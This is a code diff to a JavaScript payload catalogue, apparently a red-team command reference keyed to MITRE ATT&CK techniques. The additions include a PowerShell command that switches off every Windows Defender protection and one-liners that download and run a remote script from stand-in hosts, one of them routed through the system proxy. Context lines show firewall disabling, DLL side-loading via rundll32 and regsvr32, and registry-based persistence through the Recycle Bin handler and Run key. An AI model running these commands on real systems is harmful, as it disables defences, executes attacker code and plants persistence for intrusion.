@@ -199,6 +199,14 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': null,
         },
+        'PowerShell (Set-MpPreference)': {
+            'cmd': 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableArchiveScanning $true',
+            'cli': 'PowerShell',
+            'adminRequired': true,
+            'mitre': {'id': 'T1562.001', 'url': 'https://attack.mitre.org/techniques/T1562/001/'},
+            'lolbas': null,
+            'desc': 'The command disables each feature of Windows Defender. To restore them, set \'$false\' for each option.',
+        },
     },
     'Disable Command Logging': {
         'PowerShell': {
@@ -259,7 +267,7 @@ const PAYLOADS = {
             'adminRequired': true,
             'mitre': {'id': 'T1562.004', 'url': 'https://attack.mitre.org/techniques/T1562/004/'},
             'lolbas': null,
-            'desc': 'The command disables Windows Defender Firewall. To enable it, set \'/d 1\' in the above command.',
+            'desc': 'The command disables Windows Defender Firewall. To enable it, set \'/d 1\' in the following command.',
         },
     },
     'Download': {
@@ -313,13 +321,21 @@ const PAYLOADS = {
         },
     },
     'Download & Execute': {
-        'PowerShell (IEX)': {
-            'cmd': 'IEX((New-Object Net.WebClient).DownloadString("https://10.0.0.1/evil.ps1"))',
+        'PowerShell (iex)': {
+            'cmd': 'iex((New-Object Net.WebClient).DownloadString("https://10.0.0.1/evil.ps1"))',
             'cli': 'PowerShell',
             'adminRequired': false,
             'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
             'lolbas': null,
             'desc': 'If you run it on Commnad Prompt, call "powershell" before the command such as "powershell -nop -c \"IEX((...".',
+        },
+        'PowerShell (iex, proxy)': {
+            'cmd': '$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;iex $($w.DownloadString("https://evil.com/evil.ps1"))',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
+            'lolbas': null,
+            'desc': null,
         },
     },
     'Dump Credentials': {
@@ -548,7 +564,7 @@ const PAYLOADS = {
             'desc': 'The command enumerates the information of Wi-Fi networks that has been previously connected, and corresponding passwords.',
         },
         'Netstat': {
-            'cmd': 'netstat -a -o',
+            'cmd': 'netstat -ano',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1049', 'url': 'https://attack.mitre.org/techniques/T1049/'},
@@ -792,7 +808,7 @@ const PAYLOADS = {
             'desc': 'The command executes arbitrary Javascript code embedded in another file.',
         },
     },
-    'Execute Command': {
+    'Execute Code/Command': {
         'Bash': {
             'cmd': 'bash -c "echo hello"',
             'cli': null,
@@ -817,6 +833,22 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command copies arbitrary command and executes it by pasting with the Get-Clipboard cmdlet.'
         },
+        'PowerShell (iex, .NET)': {
+            'cmd': 'iex \'[System.Reflection.Assembly]::Load("System.Windows.Forms");[System.Windows.Forms.MessageBox]::Show("Hello world")\'',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1059.001', 'url': 'https://attack.mitre.org/techniques/T1059/001/'},
+            'lolbas': null,
+            'desc': 'The command opens MessageBox.'
+        },
+        'PowerShell (Import-Clixml)': {
+            'cmd': '"whoami" | Export-clixml evil.xml;iex $(Import-Clixml evil.xml)',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command creates a XML file that contains arbitrary command, then execute the command.',
+        },
         'Rundll32 (Shell32)': {
             'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
             'cli': null,
@@ -836,7 +868,7 @@ const PAYLOADS = {
             'desc': null,
         },
         'Regsvr32': {
-            'cmd': 'regsvr32.exe /s .\\evil.dll',
+            'cmd': 'regsvr32 /s .\\evil.dll',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1218.010', 'url': 'https://attack.mitre.org/techniques/T1218/010/'},
@@ -849,7 +881,7 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
-            'desc': 'Replace \'EntryPoint\' with the entry point of the DLL such as "DllMain" or other exported function marked with \'__declspec(dllexport)\'.',
+            'desc': 'Replace \'EntryPoint\' with the actual entry point of the DLL such as "DllMain" or other exported function marked with \'__declspec(dllexport)\'.',
         },
         'Rundll32 (Shell32)': {
             'cmd': 'rundll32 shell32.dll,Control_RunDLL C:\\evil.dll',
@@ -857,7 +889,7 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
-            'desc': null,
+            'desc': 'The DLL path (e.g. \'C:\\evil.dll\') must be absolute path.',
         },
     },
     'Execute EXE': {
@@ -1199,7 +1231,7 @@ const PAYLOADS = {
             'adminRequired': true,
             'mitre': {'id': 'T1574.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
             'lolbas': null,
-            'desc': 'The command adds arbitrary command execution to the Recycle bin (CLDID: 645FF040-5081-101B-9F08-00AA002F954E). The command will be executed when the Recycle Bin opens. To delete this setting, run \'reg delete "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open" /f\' command.',
+            'desc': 'The command adds arbitrary command execution to the Recycle bin (CLSID: 645FF040-5081-101B-9F08-00AA002F954E). The command will be executed when the Recycle Bin opens. To delete this setting, run \'reg delete "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open" /f\' command.',
         },
         'Reg (Run, Unprivileged)': {
             'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
